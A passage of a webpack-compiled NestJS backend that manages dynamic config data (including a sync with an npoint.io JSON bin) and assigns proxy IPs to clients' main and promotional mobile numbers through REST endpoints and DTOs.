    async remove(configKey, path) {
        this.logger.debug(`Removing dynamic data for configKey: ${configKey}${path ? `, path: ${path}` : ''}`);
        const session = await this.connection.startSession();
        try {
            await session.startTransaction();
            this.logger.debug('Started transaction for remove operation');
            const doc = await this.dynamicDataModel.findOne({ configKey }).session(session);
            if (!doc) {
                this.logger.warn(`Document not found with configKey: ${configKey}`);
                throw new common_1.NotFoundException(`Document with configKey ${configKey} not found`);
            }
            if (path) {
                if (!(0, lodash_1.has)(doc.data, path)) {
                    this.logger.warn(`Path ${path} not found in document with configKey: ${configKey}`);
                    throw new common_1.NotFoundException(`Path ${path} not found in document`);
                }
                this.logger.debug(`Removing data at path: ${path}`);
                (0, lodash_1.unset)(doc.data, path);
                await doc.save({ session });
            }
            else {
                this.logger.debug(`Deleting entire document with configKey: ${configKey}`);
                await this.dynamicDataModel.deleteOne({ configKey }).session(session);
            }
            await session.commitTransaction();
            this.logger.debug('Transaction committed successfully');
        }
        catch (error) {
            await session.abortTransaction();
            (0, utils_1.parseError)(error, 'Failed to remove dynamic data: ', true);
            this.logger.error(`Failed to remove dynamic data: ${error.message}`, error.stack);
            throw error;
        }
        finally {
            await session.endSession();
        }
    }
    async findAll() {
        this.logger.debug('Retrieving all dynamic data documents');
        try {
            const documents = await this.dynamicDataModel.find().exec();
            const result = documents.reduce((acc, doc) => {
                acc[doc.configKey] = doc.toJSON().data;
                return acc;
            }, {});
            this.logger.debug(`Successfully retrieved ${documents.length} dynamic data documents`);
            return result;
        }
        catch (error) {
            (0, utils_1.parseError)(error, 'Failed to retrieve all dynamic data: ', true);
            this.logger.error(`Failed to retrieve all dynamic data: ${error.message}`, error.stack);
            throw error;
        }
    }
    async checkNpoint() {
        this.logger.debug('Checking npoint data for updates');
        try {
            const response = await axios_1.default.get('https://api.npoint.io/6841a4c0c23bdc78333d');
            const npointData = response.data;
            this.logger.debug('Fetched npoint data successfully');
            const existingData = await this.findAll();
            if ((0, common_2.areJsonsNotSame)(existingData, npointData)) {
                await this.npointService.updateDocument('6841a4c0c23bdc78333d', existingData);
                this.logger.debug('Npoint data updated successfully');
            }
            else {
                this.logger.debug('No updates needed for npoint data');
            }
        }
        catch (error) {
            this.logger.error(`Failed to check/update npoint data: ${error.message}`, error.stack);
            (0, utils_1.parseError)(error, 'Failed to check/update npoint data: ', true);
            throw error;
        }
    }
};
exports.DynamicDataService = DynamicDataService;
exports.DynamicDataService = DynamicDataService = DynamicDataService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(dynamic_data_schema_1.DynamicData.name)),
    __param(1, (0, mongoose_3.InjectConnection)()),
    __metadata("design:paramtypes", [mongoose_2.Model, mongoose.Connection, npoint_service_1.NpointService])
], DynamicDataService);


/***/ }),

/***/ "./src/components/ip-management/client-ip-integration.controller.ts":
/*!**************************************************************************!*\
  !*** ./src/components/ip-management/client-ip-integration.controller.ts ***!
  \**************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientIpIntegrationController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const client_ip_integration_service_1 = __webpack_require__(/*! ./client-ip-integration.service */ "./src/components/ip-management/client-ip-integration.service.ts");
let ClientIpIntegrationController = class ClientIpIntegrationController {
    constructor(clientIpIntegrationService) {
        this.clientIpIntegrationService = clientIpIntegrationService;
    }
    async autoAssignIpsToClient(clientId) {
        try {
            return await this.clientIpIntegrationService.autoAssignIpsToClient(clientId);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async getIpForMobile(mobile, clientId, autoAssign) {
        try {
            const shouldAutoAssign = autoAssign === 'true' || autoAssign === '1';
            const ipAddress = await this.clientIpIntegrationService.getIpForMobile(mobile, clientId, shouldAutoAssign);
            const source = ipAddress ? (shouldAutoAssign ? 'auto_assigned' : 'existing_mapping') : 'not_found';
            return { mobile, ipAddress, source };
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async getClientIpSummary(clientId) {
        try {
            return await this.clientIpIntegrationService.getClientIpSummary(clientId);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async autoAssignAllIpsViaClientService(clientId) {
        try {
            return await this.clientIpIntegrationService.autoAssignIpsToClient(clientId);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async assignIpToMainMobile(clientId, body) {
        try {
            return await this.clientIpIntegrationService.assignIpToMainMobile(clientId, body.mobile, body.preferredCountry);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async assignIpsToPromoteMobiles(clientId, body) {
        try {
            return await this.clientIpIntegrationService.assignIpsToPromoteMobiles(clientId, body.promoteMobiles, body.preferredCountry);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async releaseIpFromMobile(mobile, clientId) {
        try {
            return await this.clientIpIntegrationService.releaseIpFromMobile(mobile, clientId);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async checkMobileIpStatus(mobile) {
        try {
            return await this.clientIpIntegrationService.checkMobileIpStatus(mobile);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
};
exports.ClientIpIntegrationController = ClientIpIntegrationController;
__decorate([
    (0, common_1.Post)('clients/:clientId/auto-assign-ips'),
    (0, swagger_1.ApiOperation)({ summary: 'Auto-assign IPs to all client mobile numbers' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'IPs assigned successfully' }),
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ClientIpIntegrationController.prototype, "autoAssignIpsToClient", null);
__decorate([
    (0, common_1.Get)('mobile/:mobile/ip'),
    (0, swagger_1.ApiOperation)({ summary: 'Get IP assigned to a mobile number with smart assignment' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number' }),
    (0, swagger_1.ApiQuery)({ name: 'clientId', description: 'Optional client ID for context', required: false }),
    (0, swagger_1.ApiQuery)({ name: 'autoAssign', description: 'Auto-assign IP if not found and context available', required: false }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'IP address retrieved or assigned' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('clientId')),
    __param(2, (0, common_1.Query)('autoAssign')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, String]),
    __metadata("design:returntype", Promise)
], ClientIpIntegrationController.prototype, "getIpForMobile", null);
__decorate([
    (0, common_1.Get)('clients/:clientId/ip-summary'),
    (0, swagger_1.ApiOperation)({ summary: 'Get comprehensive IP information for a client' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Client IP summary retrieved successfully' }),
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ClientIpIntegrationController.prototype, "getClientIpSummary", null);
__decorate([
    (0, common_1.Post)('clients/:clientId/auto-assign-all-ips'),
    (0, swagger_1.ApiOperation)({ summary: 'Auto-assign IPs to all client mobile numbers (alternative endpoint)' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'IPs auto-assigned using ClientService' }),
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ClientIpIntegrationController.prototype, "autoAssignAllIpsViaClientService", null);
__decorate([
    (0, common_1.Post)('clients/:clientId/assign-main-mobile-ip'),
    (0, swagger_1.ApiOperation)({ summary: 'Assign IP to client main mobile number' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID' }),
    (0, swagger_1.ApiBody)({
        schema: {
            type: 'object',
            properties: {
                mobile: { type: 'string', description: 'Mobile number' },
                preferredCountry: { type: 'string', description: 'Preferred country code' }
            },
            required: ['mobile']
        }
    }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'IP assigned to main mobile' }),
    __param(0, (0, common_1.Param)('clientId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], ClientIpIntegrationController.prototype, "assignIpToMainMobile", null);
__decorate([
    (0, common_1.Post)('clients/:clientId/assign-promote-mobiles-ips'),
    (0, swagger_1.ApiOperation)({ summary: 'Assign IPs to client promote mobile numbers' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID' }),
    (0, swagger_1.ApiBody)({
        schema: {
            type: 'object',
            properties: {
                promoteMobiles: {
                    type: 'array',
                    items: { type: 'string' },
                    description: 'Array of promote mobile numbers'
                },
                preferredCountry: { type: 'string', description: 'Preferred country code' }
            },
            required: ['promoteMobiles']
        }
    }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'IPs assigned to promote mobiles' }),
    __param(0, (0, common_1.Param)('clientId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], ClientIpIntegrationController.prototype, "assignIpsToPromoteMobiles", null);
__decorate([
    (0, common_1.Delete)('mobile/:mobile/ip'),
    (0, swagger_1.ApiOperation)({ summary: 'Release IP from a mobile number' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number' }),
    (0, swagger_1.ApiQuery)({ name: 'clientId', description: 'Optional client ID for context', required: false }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'IP released successfully' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], ClientIpIntegrationController.prototype, "releaseIpFromMobile", null);
__decorate([
    (0, common_1.Get)('mobile/:mobile/status'),
    (0, swagger_1.ApiOperation)({ summary: 'Check IP assignment status for a mobile number' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Mobile IP status retrieved successfully' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ClientIpIntegrationController.prototype, "checkMobileIpStatus", null);
exports.ClientIpIntegrationController = ClientIpIntegrationController = __decorate([
    (0, swagger_1.ApiTags)('Client IP Integration'),
    (0, common_1.Controller)('client-ip-integration'),
    __metadata("design:paramtypes", [client_ip_integration_service_1.ClientIpIntegrationService])
], ClientIpIntegrationController);


/***/ }),

/***/ "./src/components/ip-management/client-ip-integration.service.ts":
/*!***********************************************************************!*\
  !*** ./src/components/ip-management/client-ip-integration.service.ts ***!
  \***********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var ClientIpIntegrationService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientIpIntegrationService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const client_service_1 = __webpack_require__(/*! ../clients/client.service */ "./src/components/clients/client.service.ts");
const promote_client_service_1 = __webpack_require__(/*! ../promote-clients/promote-client.service */ "./src/components/promote-clients/promote-client.service.ts");
const ip_management_service_1 = __webpack_require__(/*! ./ip-management.service */ "./src/components/ip-management/ip-management.service.ts");
let ClientIpIntegrationService = ClientIpIntegrationService_1 = class ClientIpIntegrationService {
    constructor(clientService, promoteClientService, ipManagementService) {
        this.clientService = clientService;
        this.promoteClientService = promoteClientService;
        this.ipManagementService = ipManagementService;
        this.logger = new common_1.Logger(ClientIpIntegrationService_1.name);
    }
    async getPromoteMobiles(clientId) {
        return await this.clientService.getPromoteMobiles(clientId);
    }
    async autoAssignIpsToClient(clientId) {
        if (!clientId || clientId.trim() === '') {
            throw new common_1.BadRequestException('Client ID is required');
        }
        this.logger.debug(`Auto-assigning IPs to all mobiles for client: ${clientId}`);
        try {
            const client = await this.clientService.findOne(clientId);
            if (!client) {
                throw new common_1.NotFoundException(`Client ${clientId} not found`);
            }
            if (!client.mobile || client.mobile.trim() === '') {
                throw new common_1.BadRequestException(`Client ${clientId} does not have a valid main mobile number`);
            }
            const errors = [];
            let assigned = 0;
            let failed = 0;
            let mainMobileResult;
            try {
                const mainMapping = await this.ipManagementService.assignIpToMobile({
                    mobile: client.mobile,
                    clientId: client.clientId
                });
                mainMobileResult = {
                    mobile: client.mobile,
                    ipAddress: mainMapping.ipAddress,
                    status: 'assigned'
                };
                assigned++;
                this.logger.debug(`Successfully assigned IP ${mainMapping.ipAddress} to main mobile ${client.mobile}`);
            }
            catch (error) {
                mainMobileResult = {
                    mobile: client.mobile,
                    ipAddress: null,
                    status: 'failed'
                };
                const errorMsg = `Main mobile ${client.mobile}: ${error.message}`;
                errors.push(errorMsg);
                failed++;
                this.logger.error(errorMsg);
            }
            const promoteMobileResults = [];
            try {
                const promoteMobiles = await this.getPromoteMobiles(clientId);
                this.logger.debug(`Found ${promoteMobiles.length} promote mobiles for client ${clientId}`);
                for (const promoteMobile of promoteMobiles) {
                    if (!promoteMobile || promoteMobile.trim() === '') {
                        const errorMsg = `Invalid promote mobile: empty or null`;
                        errors.push(errorMsg);
                        failed++;
                        promoteMobileResults.push({
                            mobile: promoteMobile,
                            ipAddress: null,
                            status: 'failed'
                        });
                        continue;
                    }
                    try {
                        const promoteMapping = await this.ipManagementService.assignIpToMobile({
                            mobile: promoteMobile,
                            clientId: client.clientId
                        });
                        promoteMobileResults.push({
                            mobile: promoteMobile,
                            ipAddress: promoteMapping.ipAddress,
                            status: 'assigned'
                        });
                        assigned++;
                        this.logger.debug(`Successfully assigned IP ${promoteMapping.ipAddress} to promote mobile ${promoteMobile}`);
                    }
                    catch (error) {
                        promoteMobileResults.push({
                            mobile: promoteMobile,
                            ipAddress: null,
                            status: 'failed'
                        });
                        const errorMsg = `Promote mobile ${promoteMobile}: ${error.message}`;
                        errors.push(errorMsg);
                        failed++;
                        this.logger.error(errorMsg);
                    }
                }
            }
            catch (error) {
                const errorMsg = `Failed to retrieve promote mobiles for client ${clientId}: ${error.message}`;
                errors.push(errorMsg);
                this.logger.error(errorMsg);
            }
            const totalMobiles = 1 + promoteMobileResults.length;
            this.logger.log(`Auto-assignment completed for ${clientId}: ${assigned}/${totalMobiles} assigned, ${failed} failed`);
            return {
                clientId,
                mainMobile: mainMobileResult,
                promoteMobiles: promoteMobileResults,
                summary: {
                    totalMobiles,
                    assigned,
                    failed,
                    errors
                }
            };
        }
        catch (error) {
            this.logger.error(`Failed to auto-assign IPs for client ${clientId}: ${error.message}`);
            if (error instanceof common_1.BadRequestException || error instanceof common_1.NotFoundException) {
                throw error;
            }
            throw new common_1.BadRequestException(`Failed to auto-assign IPs for client ${clientId}: ${error.message}`);
        }
    }
    async getIpForMobile(mobile, clientId, autoAssign = false) {
        if (!mobile || mobile.trim() === '') {
            throw new common_1.BadRequestException('Mobile number is required');
        }
        this.logger.debug(`Getting IP for mobile: ${mobile} (clientId: ${clientId}, autoAssign: ${autoAssign})`);
        try {
            const existingIp = await this.ipManagementService.getIpForMobile(mobile);
            if (existingIp) {
                this.logger.debug(`Found existing IP mapping for ${mobile}: ${existingIp}`);
                return existingIp;
            }
            if (autoAssign && clientId) {
                const client = await this.clientService.findOne(clientId);
                if (client) {
                    const isMainMobile = mobile === client.mobile;
                    const { isPromote } = await this.clientService.isPromoteMobile(mobile);
                    if (isMainMobile || isPromote) {
                        this.logger.debug(`Mobile ${mobile} belongs to client ${clientId} as ${isMainMobile ? 'main' : 'promote'} mobile - attempting auto-assignment`);
                        try {
                            const mapping = await this.ipManagementService.assignIpToMobile({
                                mobile,
                                clientId
                            });
                            this.logger.log(`Auto-assigned IP ${mapping.ipAddress} to mobile ${mobile}`);
                            return mapping.ipAddress;
                        }
                        catch (assignError) {
                            this.logger.warn(`Failed to auto-assign IP to mobile ${mobile}: ${assignError.message}`);
                        }
                    }
                    else {
                        this.logger.debug(`Mobile ${mobile} does not belong to client ${clientId}`);
                    }
                }
                else {
                    this.logger.warn(`Client ${clientId} not found`);
                }
            }
            return null;
        }
        catch (error) {
            this.logger.error(`Error getting IP for mobile ${mobile}: ${error.message}`);
            if (error instanceof common_1.BadRequestException || error instanceof common_1.NotFoundException) {
                throw error;
            }
            throw new common_1.BadRequestException(`Failed to get IP for mobile ${mobile}`);
        }
    }
    async getClientIpSummary(clientId) {
        if (!clientId || clientId.trim() === '') {
            throw new common_1.BadRequestException('Client ID is required');
        }
        this.logger.debug(`Getting IP summary for client: ${clientId}`);
        try {
            const client = await this.clientService.findOne(clientId);
            if (!client) {
                throw new common_1.NotFoundException(`Client ${clientId} not found`);
            }
            const clientIpInfo = await this.clientService.getClientIpInfo(clientId);
            if (!clientIpInfo || !clientIpInfo.mainMobile) {
                throw new common_1.BadRequestException(`Invalid client IP info structure for client ${clientId}`);
            }
            const mainMobile = {
                mobile: client.mobile,
                ipAddress: clientIpInfo.mainMobile.ipAddress,
                type: 'main',
                status: clientIpInfo.mainMobile.hasIp ? 'assigned' : 'unassigned'
            };
            const promoteMobilesData = (clientIpInfo.promoteMobiles || []).map(pm => {
                if (!pm || typeof pm.mobile !== 'string') {
                    this.logger.warn(`Invalid promote mobile data found for client ${clientId}`);
                    return null;
                }
                return {
                    mobile: pm.mobile,
                    ipAddress: pm.ipAddress,
                    type: 'promote',
                    status: pm.hasIp ? 'assigned' : 'unassigned'
                };
            }).filter(pm => pm !== null);
            const totalMobiles = clientIpInfo.summary?.totalMobiles || (1 + promoteMobilesData.length);
            const assignedMobiles = clientIpInfo.summary?.mobilesWithIp || 0;
            const unassignedMobiles = clientIpInfo.summary?.mobilesWithoutIp || (totalMobiles - assignedMobiles);
            return {
                clientId,
                clientName: client.name || 'Unknown Client',
                mainMobile,
                promoteMobiles: promoteMobilesData,
                dedicatedIps: clientIpInfo.dedicatedIps || [],
                statistics: {
                    totalMobiles,
                    assignedMobiles,
                    unassignedMobiles,
                    totalDedicatedIps: (clientIpInfo.dedicatedIps || []).length
                }
            };
        }
        catch (error) {
            this.logger.error(`Failed to get IP summary for client ${clientId}: ${error.message}`);
            if (error instanceof common_1.BadRequestException || error instanceof common_1.NotFoundException) {
                throw error;
            }
            throw new common_1.BadRequestException(`Failed to get IP summary for client ${clientId}: ${error.message}`);
        }
    }
    async assignIpToMainMobile(clientId, mobile, preferredCountry) {
        this.logger.debug(`Assigning IP to main mobile ${mobile} for client ${clientId}`);
        const client = await this.clientService.findOne(clientId);
        if (!client) {
            throw new common_1.NotFoundException(`Client ${clientId} not found`);
        }
        if (client.mobile !== mobile) {
            throw new common_1.BadRequestException(`Mobile ${mobile} is not the main mobile for client ${clientId}`);
        }
        const mapping = await this.ipManagementService.assignIpToMobile({
            mobile,
            clientId
        });
        return {
            clientId,
            mobile,
            mobileType: 'main',
            ipAddress: mapping.ipAddress,
            status: 'assigned'
        };
    }
    async assignIpsToPromoteMobiles(clientId, promoteMobiles, preferredCountry) {
        this.logger.debug(`Assigning IPs to ${promoteMobiles.length} promote mobiles for client ${clientId}`);
        const client = await this.clientService.findOne(clientId);
        if (!client) {
            throw new common_1.NotFoundException(`Client ${clientId} not found`);
        }
        const clientPromoteMobiles = await this.getPromoteMobiles(clientId);
        for (const mobile of promoteMobiles) {
            if (!clientPromoteMobiles.includes(mobile)) {
                throw new common_1.BadRequestException(`Mobile ${mobile} is not a promote mobile for client ${clientId}`);
            }
        }
        const bulkResult = await this.ipManagementService.bulkAssignIpsToMobiles({
            mobiles: promoteMobiles,
            clientId
        });
        const results = bulkResult.results.map(result => ({
            mobile: result.mobile,
            mobileType: 'promote',
            ipAddress: result.ipAddress,
            status: result.ipAddress ? 'assigned' : 'failed',
            error: result.error
        }));
        return {
            clientId,
            assigned: bulkResult.assigned,
            failed: bulkResult.failed,
            results
        };
    }
    async getMobileType(mobile, clientId) {
        if (!mobile || mobile.trim() === '') {
            return 'unknown';
        }
        if (!clientId) {
            try {
                const mappings = await this.ipManagementService.getClientMobileMappings(clientId);
                const mapping = mappings.find(m => m.mobile === mobile);
                if (mapping) {
                    clientId = mapping.clientId;
                }
                else {
                    return 'unknown';
                }
            }
            catch (error) {
                this.logger.debug(`Could not determine clientId for mobile ${mobile}: ${error.message}`);
                return 'unknown';
            }
        }
        try {
            const client = await this.clientService.findOne(clientId);
            if (!client) {
                return 'unknown';
            }
            if (mobile === client.mobile) {
                return 'main';
            }
            else {
                const { isPromote } = await this.clientService.isPromoteMobile(mobile);
                return isPromote ? 'promote' : 'unknown';
            }
        }
        catch (error) {
            this.logger.error(`Error determining mobile type for ${mobile}: ${error.message}`);
            return 'unknown';
        }
    }
    async releaseIpFromMobile(mobile, clientId) {
        if (!mobile || mobile.trim() === '') {
            throw new common_1.BadRequestException('Mobile number is required');
        }
        this.logger.debug(`Releasing IP from mobile: ${mobile}`);
        try {
            const currentIp = await this.ipManagementService.getIpForMobile(mobile);
            if (!currentIp) {
                return {
                    mobile,
                    releasedIp: null,
                    status: 'no_ip_assigned',
                    message: `No IP assigned to mobile ${mobile}`
                };
            }
            await this.ipManagementService.releaseIpFromMobile({ mobile });
            this.logger.log(`Successfully released IP ${currentIp} from mobile ${mobile}`);
            return {
                mobile,
                releasedIp: currentIp,
                status: 'released',
                message: `Successfully released IP ${currentIp} from mobile ${mobile}`
            };
        }
        catch (error) {
            this.logger.error(`Failed to release IP from mobile ${mobile}: ${error.message}`);
            throw new common_1.BadRequestException(`Failed to release IP from mobile ${mobile}: ${error.message}`);
        }
    }
    async checkMobileIpStatus(mobile) {
        if (!mobile || mobile.trim() === '') {
            throw new common_1.BadRequestException('Mobile number is required');
        }
        try {
            const ipAddress = await this.ipManagementService.getIpForMobile(mobile);
            const hasIp = ipAddress !== null;
            let mobileType = 'unknown';
            let clientId;
            if (hasIp) {
                try {
                    mobileType = await this.getMobileType(mobile);
                }
                catch (error) {
                    this.logger.debug(`Could not determine mobile type for ${mobile}: ${error.message}`);
                }
            }
            return {
                mobile,
                hasIp,
                ipAddress,
                mobileType,
                clientId
            };
        }
        catch (error) {
            this.logger.error(`Error checking IP status for mobile ${mobile}: ${error.message}`);
            throw new common_1.BadRequestException(`Failed to check IP status for mobile ${mobile}: ${error.message}`);
        }
    }
};
exports.ClientIpIntegrationService = ClientIpIntegrationService;
exports.ClientIpIntegrationService = ClientIpIntegrationService = ClientIpIntegrationService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => promote_client_service_1.PromoteClientService))),
    __metadata("design:paramtypes", [client_service_1.ClientService,
        promote_client_service_1.PromoteClientService,
        ip_management_service_1.IpManagementService])
], ClientIpIntegrationService);


/***/ }),

/***/ "./src/components/ip-management/dto/assign-ip.dto.ts":
/*!***********************************************************!*\
  !*** ./src/components/ip-management/dto/assign-ip.dto.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ReleaseIpFromMobileDto = exports.BulkAssignIpDto = exports.AssignIpToMobileDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class AssignIpToMobileDto {
}
exports.AssignIpToMobileDto = AssignIpToMobileDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '916265240911', description: 'Mobile number to assign IP to' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], AssignIpToMobileDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'client1', description: 'Client ID that owns this mobile number' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], AssignIpToMobileDto.prototype, "clientId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '192.168.1.100:8080', description: 'Specific IP to assign (optional - if not provided, will auto-assign)', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], AssignIpToMobileDto.prototype, "preferredIp", void 0);
class BulkAssignIpDto {
}
exports.BulkAssignIpDto = BulkAssignIpDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: ['916265240911', '916265240912'], description: 'Array of mobile numbers to assign IPs to' }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.IsString)({ each: true }),
    __metadata("design:type", Array)
], BulkAssignIpDto.prototype, "mobiles", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'client1', description: 'Client ID that owns these mobile numbers' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], BulkAssignIpDto.prototype, "clientId", void 0);
class ReleaseIpFromMobileDto {
}
exports.ReleaseIpFromMobileDto = ReleaseIpFromMobileDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '916265240911', description: 'Mobile number to release IP from' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], ReleaseIpFromMobileDto.prototype, "mobile", void 0);


/***/ }),

/***/ "./src/components/ip-management/dto/create-proxy-ip.dto.ts":
/*!*****************************************************************!*\
  !*** ./src/components/ip-management/dto/create-proxy-ip.dto.ts ***!
  \*****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateProxyIpDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class CreateProxyIpDto {
}
exports.CreateProxyIpDto = CreateProxyIpDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '192.168.1.100', description: 'IP address of the proxy' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateProxyIpDto.prototype, "ipAddress", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 8080, description: 'Port number of the proxy' }),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], CreateProxyIpDto.prototype, "port", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'http', description: 'Protocol type', enum: ['http', 'https', 'socks5'] }),
